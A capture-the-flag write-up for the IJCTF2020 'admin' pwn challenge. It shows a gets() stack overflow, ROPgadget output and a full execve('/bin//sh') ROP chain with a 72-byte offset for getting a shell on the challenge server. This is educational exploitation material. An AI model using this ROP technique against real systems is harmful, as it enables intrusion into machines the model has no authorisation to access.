
## admin
### Description

> This admin thinks his system is very safe Is it actually safe? I say it's safe what do you think?
>
> nc 35.186.153.116 7002
>
> Author: zilikos

### Attachment

[admin](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/IJCTF2020/pwn/admin/admin)

### Analysis

#### statically linked
This elf is statically linked:
```
$ file admin
admin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=0ee31668ec040c05db870d1fcef7e198c0a53d37, stripped
```

#### bof in main func
```c
__int64 sub_400B4D(){
  __int64 result; // rax
  char v1; // [rsp+0h] [rbp-40h]

  puts("Username: ");
  gets(&v1);
  if ( (unsigned int)strcmp(&v1, "admin") )
    result = printf((unsigned __int64)"Bye %s\n");
  else
    result = puts("Welcome admin");
  return result;
}
```
> `gets(&v1)` do not limit the length of our input data

### Solution

As this elf is statically linked, we can generate ropchain by ROPgadget automacticlly as follows:

#### generate ropchain by ROPgadget

```python
$ ROPgadget --binary ./admin --ropchain
# ...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47f321 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x410193 pop rsi ; ret
	[+] Gadget found: 0x415544 pop rax ; ret
	[+] Gadget found: 0x444aa0 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x444aa0 xor rax, rax ; ret
	[+] Gadget found: 0x474770 add rax, 1 ; ret
	[+] Gadget found: 0x474771 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400686 pop rdi ; ret
	[+] Gadget found: 0x410193 pop rsi ; ret
	[+] Gadget found: 0x449765 pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x40123c syscall

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x0000000000415544) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
	p += pack('<Q', 0x00000000006b90e0) # @ .data
	p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000449765) # pop rdx ; ret
	p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
	p += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000040123c) # syscall

```

#### rop

Overwrite the return address with `ropchain` that we can get shell directly:

```python
offset = 72
payload = 'A'*offset
payload += ropchain()

# ru('')
sl(payload)
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/IJCTF2020/pwn/admin) 


